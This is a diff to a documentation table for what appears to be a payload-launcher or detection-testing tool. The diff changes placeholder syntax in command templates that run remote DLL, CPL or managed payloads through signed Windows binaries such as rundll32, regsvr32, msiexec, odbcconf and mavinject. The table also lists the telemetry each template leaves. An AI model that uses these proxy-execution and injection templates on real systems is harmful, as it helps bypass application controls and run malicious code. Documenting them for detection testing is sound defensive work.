@@ -19,16 +19,16 @@ If you build the payload yourself, start with [authoring launcher-compatible pay
 
 | Selector | Payload | Generated invocation | Required contract | Key telemetry |
 |---|---|---|---|---|
-| `rundll32.exe` | `dll` | `rundll32.exe <remote-path>,<entry-point>` | Export supplied by `--entry-point` | `rundll32` command line, DLL load |
-| `rundll32.exe (advpack RegisterOCX)` | `dll` | `rundll32.exe advpack.dll,RegisterOCX <remote-path>` | `DllRegisterServer` | `rundll32` loading `advpack.dll`, DLL load |
-| `msiexec.exe (/y)`, `msiexec.exe (/z)` | `dll` | `msiexec.exe /y|/z <remote-path>` | `DllRegisterServer` or `DllUnregisterServer` | `msiexec` DLL registration, DLL load |
-| `odbcconf.exe` | `dll` | `odbcconf.exe /a {REGSVR <remote-path>}` | `DllRegisterServer` | `odbcconf` process, DLL load |
-| `regsvr32.exe` variants | `dll` | `regsvr32.exe /s [...] <remote-path>` | `DllRegisterServer`, `DllUnregisterServer`, or `DllInstall` | `regsvr32` command line, DLL load |
-| `control.exe` | `cpl` | `control.exe <remote-path>` | CPL module implementing `CPlApplet` | Control Panel module path, child processes |
-| `mavinject.exe` | `dll` | `mavinject.exe <process-id> /INJECTRUNNING <remote-path>` | Native DLL compatible with the selected process | Cross-process injection, module load |
-| `RegAsm.exe`, `RegAsm.exe (/U)` | `managed` | `RegAsm.exe [/U] <remote-path>` | COM registration or unregistration callback | .NET registration process, registry writes |
-| `RegSvcs.exe`, `RegSvcs.exe (/U)` | `managed` | `RegSvcs.exe [/U] <remote-path>` | Signed serviced-component assembly | Enterprise-services registration |
-| `InstallUtil.exe`, `InstallUtil.exe (/U)` | `managed` | `InstallUtil.exe ... [/U] <remote-path>` | `[RunInstaller(true)]` installer implementation | `InstallUtil` process, managed assembly load |
+| `rundll32.exe` | `dll` | `rundll32.exe REMOTE_PATH,ENTRY_POINT` | Export supplied by `--entry-point` | `rundll32` command line, DLL load |
+| `rundll32.exe (advpack RegisterOCX)` | `dll` | `rundll32.exe advpack.dll,RegisterOCX REMOTE_PATH` | `DllRegisterServer` | `rundll32` loading `advpack.dll`, DLL load |
+| `msiexec.exe (/y)`, `msiexec.exe (/z)` | `dll` | `msiexec.exe /y|/z REMOTE_PATH` | `DllRegisterServer` or `DllUnregisterServer` | `msiexec` DLL registration, DLL load |
+| `odbcconf.exe` | `dll` | `odbcconf.exe /a {REGSVR REMOTE_PATH}` | `DllRegisterServer` | `odbcconf` process, DLL load |
+| `regsvr32.exe` variants | `dll` | `regsvr32.exe /s [...] REMOTE_PATH` | `DllRegisterServer`, `DllUnregisterServer`, or `DllInstall` | `regsvr32` command line, DLL load |
+| `control.exe` | `cpl` | `control.exe REMOTE_PATH` | CPL module implementing `CPlApplet` | Control Panel module path, child processes |
+| `mavinject.exe` | `dll` | `mavinject.exe PROCESS_ID /INJECTRUNNING REMOTE_PATH` | Native DLL compatible with the selected process | Cross-process injection, module load |
+| `RegAsm.exe`, `RegAsm.exe (/U)` | `managed` | `RegAsm.exe [/U] REMOTE_PATH` | COM registration or unregistration callback | .NET registration process, registry writes |
+| `RegSvcs.exe`, `RegSvcs.exe (/U)` | `managed` | `RegSvcs.exe [/U] REMOTE_PATH` | Signed serviced-component assembly | Enterprise-services registration |
+| `InstallUtil.exe`, `InstallUtil.exe (/U)` | `managed` | `InstallUtil.exe ... [/U] REMOTE_PATH` | `[RunInstaller(true)]` installer implementation | `InstallUtil` process, managed assembly load |
 
 Selectors containing spaces or parentheses must be quoted in a shell:
 
